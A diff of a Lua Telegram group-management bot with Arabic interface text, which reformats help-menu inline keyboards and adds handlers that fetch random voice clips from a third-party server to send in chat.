+{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16536,22 +16531,14 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '⌯ ❹❹ ⌯', callback_data="/help"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
+{{text = '❸❸', callback_data="/help5"},{text = '⌯ ❹❹ ⌯', callback_data="/help"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
+{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
-if Text == '/help7' or text == 'الاوامر' then
+if Text == '/help7' then
 if not Mod(data) then
 local notText = '🚫 عذرا الاوامر هذه لا تخصك'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
@@ -16610,18 +16597,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = '⌯ اوامر التسليه ⌯', callback_data="/help"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
+{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
+{{text = '⌯ اوامر التسليه ⌯', callback_data="/help"}},
+{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16638,18 +16617,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
+{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
+{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16758,7 +16729,32 @@ keyboard.inline_keyboard = {
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
-
+if Text == "/voice1" then
+data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
+if res == 200 then
+audios = json:decode(data)
+if audios.Info == true then
+local Text ='☉┇ تم اختيار المقطع الصوتي لك'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'مقطع اخر.',callback_data="/voice2"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/editMessageVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end end end
+if Text == "/voice2" then
+data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
+if res == 200 then
+audios = json:decode(data)
+if audios.Info == true then
+local Text ='☉┇ تم اختيار المقطع الصوتي لك'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'مقطع اخر.',callback_data="/voice1"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/editMessageVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end end end
 if Text == '/mute-name' then
 if not Constructor(data) then
 local notText = '🚫 عذرا الاوامر هذه لا تخصك'
@@ -16981,7 +16977,7 @@ send(msg.chat_id_, msg.id_, ' ☉┇ تم تعطيل اوامر التسليه')
 database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
 end
 if (text and text == "تفعيل اوامر التسليه") then 
-send(msg.chat_id_, msg.id_, '  ☉┇ تم تفعيل اوامر التسليه')
+send(msg.chat_id_, msg.id_, ' ☉┇ تم تفعيل اوامر التسليه')
 database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
 end
 local Name_Bot = (database:get(bot_id..'Name:Bot') or 'باور')
